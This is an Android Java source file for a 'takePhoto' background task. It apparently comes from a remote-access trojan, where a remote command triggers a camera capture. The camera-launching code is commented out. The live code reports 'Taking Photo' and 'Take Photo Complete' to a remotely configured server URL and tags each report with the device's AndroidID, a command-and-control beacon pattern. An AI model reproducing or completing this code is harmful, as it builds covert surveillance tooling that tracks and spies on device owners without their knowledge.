package u.can.i.up.expert.utils;

import android.os.AsyncTask;
import android.preference.PreferenceManager;

import java.io.UnsupportedEncodingException;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class takePhoto extends AsyncTask<String, Void, String> {
    String i = "0";
    public takePhoto(String i) {
        this.i = i;
    }
    @Override
    protected String doInBackground(String... params) {
//        	int numCameras = Camera.getNumberOfCameras();
//        	if (numCameras > Integer.parseInt(i)) {
//        	Intent intent = new Intent(getApplicationContext(), CameraView.class);
//        	Log.i("com.connect", "I: " + i);
//        	intent.putExtra("Camera", i);
//        	intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        	startActivity(intent);
//        	}
        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Taking Photo");
        } catch (UnsupportedEncodingException e1) {
            e1.printStackTrace();
        }
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Take Photo Complete");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }        }
    @Override
    protected void onPreExecute() {
        while(PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getBoolean("Media",false) == true)
        {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Media",true).commit();
    }
    @Override
    protected void onProgressUpdate(Void... values) {}
}

